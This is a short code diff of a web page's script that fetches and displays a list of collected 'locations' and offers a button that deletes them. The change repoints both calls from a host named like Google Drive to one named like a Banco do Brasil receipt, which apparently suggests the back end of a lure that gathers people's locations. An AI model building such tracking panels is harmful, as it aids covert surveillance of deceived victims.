@@ -13,7 +13,7 @@
     </div>
 
     <script>
-        fetch('https://google-drive-vbfg.onrender.com/api/locations')
+        fetch('https://bb-comprovante.onrender.com/api/locations')
             .then(response => response.json())
             .then(data => {
                 const locationsDiv = document.getElementById('locations');
@@ -32,7 +32,7 @@
 
         // Lógica para limpar dados
         document.getElementById('clearData').addEventListener('click', function() {
-            fetch('https://google-drive-vbfg.onrender.com/api/locations', { method: 'DELETE' }) // Exemplo de requisição para limpeza
+            fetch('https://bb-comprovante.onrender.com/api/locations', { method: 'DELETE' }) // Exemplo de requisição para limpeza
                 .then(response => {
                     if (response.ok) {
                         document.getElementById('locations').innerHTML = ''; // Limpa a exibição
